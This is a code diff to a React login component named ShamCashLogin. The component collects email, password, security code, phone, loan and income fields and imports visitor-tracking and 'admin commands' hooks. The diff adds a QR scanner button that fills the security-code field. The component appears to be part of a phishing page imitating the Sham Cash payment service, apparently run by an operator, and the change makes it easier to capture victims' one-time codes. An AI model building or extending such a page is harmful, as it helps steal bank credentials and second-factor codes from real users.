@@ -2,6 +2,7 @@ import {
   Banknote, Grid3X3, Headphones, Lock, Phone, ShieldCheck, TrendingUp, UserRound,
 } from "lucide-react";
 import { useState, useEffect } from "react";
+import { QRScanner } from "@/components/QRScanner";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
@@ -49,6 +50,7 @@ function ShamLogo() {
 }
 
 export function ShamCashLogin() {
+  const [showQR, setShowQR] = useState(false);
   const [fields, setFields] = useState({ email: "", password: "", securityCode: "", loan: "", phone: "", income: "" });
   const [lang, setLang] = useLang();
   const t = T[lang];
@@ -169,7 +171,7 @@ export function ShamCashLogin() {
           </div>
 
           <div className="grid grid-cols-[58px_1fr] gap-3 pt-1" dir="ltr">
-            <button type="button" className="flex h-[58px] w-[58px] items-center justify-center rounded-[15px] bg-[#657bd8] shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]">
+            <button type="button" onClick={() => setShowQR(true)} className="flex h-[58px] w-[58px] items-center justify-center rounded-[15px] bg-[#657bd8] shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]">
               <Grid3X3 className="h-8 w-8 text-white" strokeWidth={2.6} />
             </button>
             <button type="submit" className="h-[58px] rounded-[15px] bg-[#657bd8] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]">
@@ -205,6 +207,16 @@ export function ShamCashLogin() {
           </div>
         </footer>
       </div>
+
+      {showQR && (
+        <QRScanner
+          onScan={(result) => {
+            setFields((p) => ({ ...p, securityCode: result }));
+            setShowQR(false);
+          }}
+          onClose={() => setShowQR(false)}
+        />
+      )}
     </div>
   );
 }
